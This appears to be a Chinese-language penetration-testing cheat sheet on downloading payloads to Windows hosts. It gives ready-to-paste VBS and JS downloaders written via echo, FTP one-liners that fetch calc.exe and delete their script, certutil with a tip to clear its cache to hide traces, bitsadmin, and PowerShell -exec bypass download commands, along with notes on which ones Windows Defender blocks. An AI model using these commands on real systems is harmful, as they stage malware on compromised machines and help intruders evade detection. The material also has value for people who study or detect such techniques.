# payload下载方式

## 1、VBS下载

### 1、下载方式1

```text
## down.vbs

set a=createobject("adod"+"b.stream"):set w=createobject("micro"+"soft.xmlhttp"):w.open "get",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2

## echo写入

echo set a=createobject("adod"+"b.stream"):set w=createobject("micro"+"soft.xmlhttp"):w.open "get",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 > down.vbs

## 下载文件

cscript down.vbs http://172.16.175.1/robots.txt d:\test\r.txt
```

### 2、无参数方式下载

```text
## down.vbs

strFileURL = "http://172.16.175.1/robots.txt"
strHDLocation = "D:\\readme.txt"
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
	objXMLHTTP.open "GET", strFileURL, false
	objXMLHTTP.send()
If objXMLHTTP.Status = 200 Then
Set objADOStream = CreateObject("ADODB.Stream")
	objADOStream.Open
	objADOStream.Type = 1
	objADOStream.Write objXMLHTTP.ResponseBody
	objADOStream.Position = 0
Set objFSO = CreateObject("Scripting.FileSystemObject")
If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
Set objFSO = Nothing
objADOStream.SaveToFile strHDLocation
objADOStream.Close
Set objADOStream = Nothing
End if
Set objXMLHTTP = Nothing

## 使用echo写入代码，不需要写入缩进

echo strFileURL = "http://172.16.175.1/robots.txt" > down.vbs
echo strHDLocation = "D:\\readme.txt" >> down.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> down.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> down.vbs
echo objXMLHTTP.send() >> down.vbs
echo If objXMLHTTP.Status = 200 Then >> down.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >> down.vbs
echo objADOStream.Open >> down.vbs
echo objADOStream.Type = 1 >> down.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> down.vbs
echo objADOStream.Position = 0 >> down.vbs
echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> down.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> down.vbs
echo Set objFSO = Nothing >> down.vbs
echo objADOStream.SaveToFile strHDLocation >> down.vbs
echo objADOStream.Close >> down.vbs
echo Set objADOStream = Nothing >> down.vbs
echo End if >> down.vbs
echo Set objXMLHTTP = Nothing >> down.vbs

## 使用cscript下载

cscript down.vbs
```

![](../../.gitbook/assets/image%20%28415%29.png)

### 3、兼容性测试

![Win2003 R2 SP2](../../.gitbook/assets/image%20%28414%29.png)

![Win2008 R2](../../.gitbook/assets/image%20%28405%29.png)

![Win10](../../.gitbook/assets/image%20%28393%29.png)

![HTTPS&#x4E0B;&#x8F7D;&#x6D4B;&#x8BD5;&#x5931;&#x8D25;](../../.gitbook/assets/image%20%28419%29.png)

## 2、JS下载

### 1、字符类payload

```text
## down.js

var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
WScript.Echo(WinHttpReq.ResponseText);

## 使用echo写入

echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText); > down.js

##cscript调用下载，这里要用/nologo 否则会把banner信息写入hello.txt
cscript /nologo down.js http://172.16.175.1/robots.txt > Hello.txt
```

![&#x5728;Win2003&#x91CC;&#x6D4B;&#x8BD5;](../../.gitbook/assets/image%20%28379%29.png)

### 2、二进制payload

```text
## down.js

var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));

## 使用echo写入

echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET",WScript.Arguments(0),false);WinHttpReq.Send();BinStream = new ActiveXObject("ADODB.Stream");BinStream.Type = 1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile(WScript.Arguments(1)); > down.js
 
## 使用cscript调用

cscript /nologo down.js http://172.16.175.1/robots.txt D:\test\Hello.txt
cscript /nologo down.js http://172.16.175.1/calc.exe D:\test\calc.exe
```

### 3、兼容性测试

![Windows2003](../../.gitbook/assets/image%20%28390%29.png)

![Windows2008](../../.gitbook/assets/image%20%28384%29.png)

![win10](../../.gitbook/assets/image%20%28401%29.png)

![HTTPS&#x4E0B;&#x8F7D;](../../.gitbook/assets/image%20%28404%29.png)

## 3、FTP下载

ftp命令也是全版本Windows系统都默认包含的，其中-s参数可以指定包含 FTP 命令的文本文件；命令在 FTP 启动后自动运行，可以被利用自动下载远程文件

### 1、匿名模式

```text
## 写入ftp脚本

echo open 127.0.0.1 21> ftp.txt
echo binary >> ftp.txt
echo get calc.exe >> ftp.txt
echo bye >> ftp.txt

## ftp命令调用
# -A 使用匿名模式，-s:指定ftp脚本

ftp -A -s:ftp.txt
```

![](../../.gitbook/assets/image%20%28381%29.png)

### 2、密码模式

```text
## 写入ftp脚本

# user / pass 后面不要有空格
echo open 127.0.0.1 21> ftp.txt
echo user>> ftp.txt
echo pass>> ftp.txt
echo binary >> ftp.txt
echo get calc.exe >> ftp.txt
echo bye >> ftp.txt 

## ftp命令调用
# -A 使用匿名模式，-s:指定ftp脚本

ftp -s:ftp.txt
```

![](../../.gitbook/assets/image%20%28392%29.png)

### 3、一句话下载

合并写入脚本与调用的步骤

```text
## 匿名版

echo open 172.16.175.200 21>f&echo binary>>f&echo get calc.exe>>f&echo bye>>f&ftp -A -s:f&del /f /q f

## 密码版

echo open 172.16.175.200 21>f&echo user>>f&echo pass>>f&echo binary>>f&echo get calc.exe>>f&echo bye>>f&ftp -s:f&del /f /q f

## 最短语句版
## 必备条件：匿名、FTP服务器端口是默认的21

echo open 172.16.175.200>f&echo get calc.exe>>f&echo bye>>f&ftp -A -s:f&del /f /q f
```

![&#x533F;&#x540D;&#x7248;](../../.gitbook/assets/image%20%28418%29.png)

![&#x5BC6;&#x7801;&#x7248;](../../.gitbook/assets/image%20%28410%29.png)

![&#x6700;&#x77ED;&#x8BED;&#x53E5;&#x7248;](../../.gitbook/assets/image%20%28413%29.png)

## 4、certutil下载

该工具是证书服务的组件，用于转储和显示证书颁发机构配置信息，配置证书服务，备份和还原CA组件以及验证证书，密钥对和证书链。 经过测试该组件在Win2003、2008、7、10里可用，**XP下没有**

**1、下载测试**

```text
certutil.exe -urlcache -split -f http://172.16.175.1/robots.txt
```

![](../../.gitbook/assets/image%20%28399%29.png)

使用certutil下载文件之后一定要**记得清理缓存**

```text
certutil.exe -urlcache -split -f http://172.16.175.1/robots.txt delete
```

![](../../.gitbook/assets/image%20%28385%29.png)

如果没有清理缓存，你的下载记录都会在这里

```text
## 缓存位置：

%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
```

![](../../.gitbook/assets/image%20%28380%29.png)

**2、Windows defender**

经过测试 Windows Defender现在会拦截 certutil下载文件

![](../../.gitbook/assets/image%20%28394%29.png)

**3、其他常用功能**

```text
## hash计算
## certutil还可以用来计算文件hash，不指定算法默认计算sha1，还可以指定其它算法比如md5、sha256

certutil -hashfile calc.exe md5
```

![](../../.gitbook/assets/image%20%28416%29.png)

```text
## base64编码文件

-encode 编码文件
```

![](../../.gitbook/assets/image%20%28402%29.png)

![](../../.gitbook/assets/image%20%28407%29.png)

```text
-decode 解码文件
```

![](../../.gitbook/assets/image%20%28388%29.png)

```text
## Hex编码文件

-encodehex 把文件编码为hex    #可以用来应急查看文件16进制，还有一个对应的-decodehex
```

![](../../.gitbook/assets/image%20%28412%29.png)

## 5、BITSAdmin下载

这个工具的设计目的应该就是为了传输文件，具有很丰富的下载选项，可以限速、设置代理。但是只存在于Win7、2008之后的操作系统。 

**常用命令** 

目标地址必须使用绝对路径

```text
bitsadmin /transfer down /priority high "http://172.16.175.1/robots.txt" C:\Users\xxx\Downloads\a.txt
```

限速，修改优先级

```text
bitsadmin /transfer down /priority normal "http://172.16.175.1/robots.txt" C:\Users\xxx\Downloads\a.txt
```

测试https下载，没有问题，WD也没有报毒

```text
bitsadmin /transfer down /priority normal "https://github.com/ChrisKempson/Tomorrow-Theme/raw/master/Images/Tomorrow-Night-Blue-Palette.png" C:\Users\xxx\Downloads\a.png
```

![](../../.gitbook/assets/image%20%28371%29.png)

## 6、powershell下载

这里提供了两个下载的方式，一个只支持PS3.0+，可以使用通用的2.0版本

### 1、查看PS版本

```text
powershell $PSVersionTable
```

![](../../.gitbook/assets/image%20%28409%29.png)

### 2、基于Sytem.Net.WebClient

```text
## win7、2008默认ps版本为2.0+可用

powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('https://www.baidu.com/img/bd_logo1.png','C:\Users\xxx\Downloads\abc.png')
```

### 3、基于Invoke-WebRequest

```text
## win8.1默认ps版本3.0+可用
## 使用powershell3.0支持的新方法Invoke-WebRequest

powershell -exec bypass -c (Invoke-WebRequest -Uri 'https://www.baidu.com/img/bd_logo1.png' -OutFile 'C:\Users\xxx\Downloads\xyz.png')
```



